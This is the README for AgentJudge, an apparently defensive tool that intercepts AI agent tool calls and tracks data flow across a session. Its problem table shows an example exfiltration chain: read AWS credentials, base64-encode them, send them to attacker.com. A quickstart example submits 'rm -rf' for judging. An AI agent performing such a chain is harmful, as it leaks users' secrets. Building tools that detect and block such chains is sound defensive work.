# AgentJudge

**Real-time audit and interception for AI agent tool calls** — judge what the agent *does*,
before it does it.

[![CI](https://github.com/haohaohao-cell/agentjudge/actions/workflows/ci.yml/badge.svg)](https://github.com/haohaohao-cell/agentjudge/actions/workflows/ci.yml)
[![Python](https://img.shields.io/badge/python-3.11%2B-3776AB?logo=python&logoColor=white)](pyproject.toml)
[![License](https://img.shields.io/badge/license-MIT-blue.svg)](LICENSE)
[![Dependencies](https://img.shields.io/badge/runtime%20dependencies-0-brightgreen)](pyproject.toml)

![Workbench](docs/screenshot.png)

*Workbench: step 3 (`curl`) trips the canary guard, the cross-step data-flow guard and the
outbound-network rule — three readable reasons in one decision.*

## The problem

Content filters, sandboxes and allow-lists judge **one call at a time**:

| Step | Call | Single-step check |
| --- | --- | --- |
| 1 | `read_file("~/.aws/credentials")` | file permission: OK |
| 2 | `base64_encode(data)` | data processing: OK |
| 3 | `http_request("https://attacker.com", data)` | network tool: OK |

Individually compliant, collectively an exfiltration chain. AgentJudge raises the unit of
audit from a single call to the **session-level data flow**.

## What it does

- **Cross-step data-flow guard** — tags sensitive values, propagates taint (exact, encoded,
  token-overlap) and blocks credential → external-network chains.
- **Five deterministic guards** — canary tokens, steganography scan, tool/skill contracts,
  regex rule engine, data-flow. Every hit is explainable.
- **Skill "say-vs-do" inspection** — compares what a skill's docs claim with what its code
  actually does, emits a machine-readable contract, and enforces it at runtime
  (`trusted` / `conditional` / `quarantined`).
- **Tamper-evident audit chain** — HMAC-SHA256 hash chain plus an out-of-database tail anchor.
  Modify, delete, truncate or replace records and verification fails with the exact break point.
- **Alerts and ledger** — denies, escalations and quarantines are pushed to Feishu, WeCom,
  DingTalk, Slack, generic webhooks or SMTP email; the cross-session event ledger exports to
  CSV (Excel-ready) or a self-contained HTML report.
- **Policy regression guard** — a committed baseline (`datasets/baseline.json`) makes CI fail on
  new false positives, higher ASR or a scene that used to pass.
- **Zero runtime dependencies** — pure Python standard library (TOML config). Offline,
  air-gapped, no GPU, no external service.
- **Run as MCP server: `agentjudge mcp`** — plug into Claude Desktop or Cursor; see
  [docs/mcp-server.md](docs/mcp-server.md).
- **Sidecar integration** — SDK decorator, HTTP API, MCP server (stdio), MCP proxy,
  OpenClaw pointer plugin.

## Quickstart

```bash
git clone https://github.com/haohaohao-cell/agentjudge.git && cd agentjudge
python run.py demo          # 3-step exfiltration chain, blocked at step 3
python run.py serve         # workbench at http://127.0.0.1:8737
python run.py eval          # 17 red-team scenarios + 55 benign cases
```

```bash
curl -X POST http://127.0.0.1:8737/api/v1/intercept \
  -H 'Content-Type: application/json' \
  -d '{"session_id":"s1","tool":"shell.exec","args":{"command":"rm -rf protected"}}'
```

```python
from agentjudge import Judge
from agentjudge.sdk import AgentGuard

guard = AgentGuard(Judge.from_policy("policies/default.toml"), session_id="ops")

@guard.tool("shell.exec")
def run(command: str) -> str: ...
```

## Measured on the bundled dataset

| Metric | Value |
| --- | --- |
| Red-team scenarios | 17 (15 attacks + 2 benign) |
| Intercepted | 15 / 15 |
| ASR (attack success rate) | **0.0%** |
| Benign task completion | 96.4% |
| False positive rate | 3.6% (2 / 55 grey-zone ops) |
| Decision latency | p50 **0.48 ms** / p95 **0.80 ms** |
| Unit tests | 195 passing |

Self-built corpus; reproduce with `agentjudge eval`. See [docs/evaluation.md](docs/evaluation.md).

## Documentation

| Doc | Content |
| --- | --- |
| [docs/architecture.md](docs/architecture.md) | Layers, decision sequence, design trade-offs |
| [docs/threat-model.md](docs/threat-model.md) | Assets, adversaries, trust boundaries, residual risks |
| [docs/policy-reference.md](docs/policy-reference.md) | Policy schema, rules, contracts |
| [docs/audit-chain.md](docs/audit-chain.md) | Chain construction, tail anchor, verification |
| [docs/skill-contract.md](docs/skill-contract.md) | Say-vs-do scoring and contract generation |
| [docs/api.md](docs/api.md) | HTTP API and SSE events |
| [docs/deployment.md](docs/deployment.md) | Docker, systemd, key management, upgrades |
| [docs/alerting.md](docs/alerting.md) | Feishu/WeCom/DingTalk/Slack/email alerting |
| [docs/mcp-server.md](docs/mcp-server.md) | Run AgentJudge as an MCP server |
| [docs/evaluation.md](docs/evaluation.md) | Metrics, datasets, how to add scenarios |
| [docs/roadmap.md](docs/roadmap.md) | Roadmap |

Chinese README: [README.md](README.md)

## License

[MIT](LICENSE) © 2026 AgentJudge Contributors.
Defensive security research only — deploy it only on agents and hosts you are authorized to supervise.
